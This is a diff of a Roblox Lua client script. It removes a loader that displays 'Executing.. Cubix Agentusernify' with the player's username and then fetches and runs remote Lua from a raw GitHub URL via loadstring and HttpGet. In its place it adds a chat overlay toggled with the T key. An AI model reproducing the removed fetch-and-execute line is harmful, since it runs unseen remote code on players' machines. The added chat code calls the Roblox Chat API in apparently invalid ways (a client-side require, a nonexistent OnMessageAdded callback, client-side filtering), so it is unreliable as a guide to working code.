@@ -1,42 +1,41 @@
 
-function functionExists()
-    return true
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local ChatService = require(game:GetService("Chat"))
+
+
+local chatFrame = Instance.new("Frame")
+chatFrame.Size = UDim2.new(0.3, 0, 0.4, 0)
+chatFrame.Position = UDim2.new(0.7, 0, 0.6, 0)
+chatFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+chatFrame.BackgroundTransparency = 0.5
+chatFrame.Parent = PlayerGui
+
+local chatMessages = Instance.new("TextLabel")
+chatMessages.Size = UDim2.new(1, 0, 1, 0)
+chatMessages.BackgroundTransparency = 1
+chatMessages.TextColor3 = Color3.fromRGB(255, 255, 255)
+chatMessages.TextStrokeTransparency = 0.7
+chatMessages.TextScaled = true
+chatMessages.TextWrapped = true
+chatMessages.Parent = chatFrame
+
+
+local function toggleChatVisibility()
+    chatFrame.Visible = not chatFrame.Visible
 end
 
 
-if functionExists() then
-
-    local player = game.Players.LocalPlayer
-    local username = player.Name
-    local screenGui = Instance.new("ScreenGui")
-    local frame = Instance.new("Frame")
-    local textLabel = Instance.new("TextLabel")
-
-    screenGui.Parent = player:WaitForChild("PlayerGui")
-    screenGui.Name = "CustomUI"
-
-    frame.Parent = screenGui
-    frame.BackgroundColor3 = Color3.new(0, 0, 0)
-    frame.Size = UDim2.new(0, 300, 0, 150)
-    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
-
-    textLabel.Parent = frame
-    textLabel.Text = "Executing.. Cubix Agentusernify\n\nUsername: " .. username
-    textLabel.Size = UDim2.new(1, 0, 1, 0)
-    textLabel.TextColor3 = Color3.new(1, 1, 1)
-    textLabel.BackgroundTransparency = 1
-    textLabel.TextScaled = true
+local UIS = game:GetService("UserInputService")
+UIS.InputBegan:Connect(function(input, gameProcessedEvent)
+    if not gameProcessedEvent and input.KeyCode == Enum.KeyCode.T then
+        toggleChatVisibility()
+    end
+end)
 
 
-    wait(2)
-
-
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/0tff/dumpfolder/main/script%3Dtrue.lua", true))()
-
-
-    textLabel.Text = "Executed"
-    wait(2)
-
-
-    screenGui:Destroy()
+ChatService.OnMessageAdded = function(message)
+    local filteredMessage = ChatService:FilterStringForUser(message.Text, LocalPlayer.UserId)
+    chatMessages.Text = chatMessages.Text .. "\n" .. filteredMessage
 end
